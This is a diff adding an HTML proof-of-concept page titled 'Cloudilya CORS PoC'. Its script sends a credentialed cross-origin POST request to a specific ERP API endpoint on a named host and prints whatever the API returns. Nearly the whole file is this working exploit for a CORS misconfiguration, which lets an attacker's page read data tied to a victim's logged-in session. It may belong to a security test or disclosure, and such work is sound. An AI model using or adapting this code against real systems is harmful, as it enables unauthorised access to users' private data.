@@ -1,0 +1,47 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cloudilya CORS PoC</title>
+</head>
+<body>
+    <h2>Cloudilya CORS Security Test</h2>
+    <button onclick="testCORS()">Test API</button>
+    <pre id="result">Waiting for test...</pre>
+
+    <script>
+    async function testCORS() {
+        const output = document.getElementById("result");
+
+        const url =
+          "https://anitstest.beessoftware.cloud/CloudilyaOBE/erp/api/ErpCeo/CollegeNamesLogo";
+
+        output.textContent = "Sending cross-origin request...";
+
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    grpCode: "anitstest"
+                })
+            });
+
+            const data = await response.text();
+
+            output.textContent =
+                "CORS REQUEST COMPLETED\n" +
+                "HTTP Status: " + response.status +
+                "\n\nAPI Response:\n" + data;
+
+        } catch (error) {
+            output.textContent =
+                "REQUEST FAILED\n" + error.message;
+        }
+    }
+    </script>
+</body>
+</html>
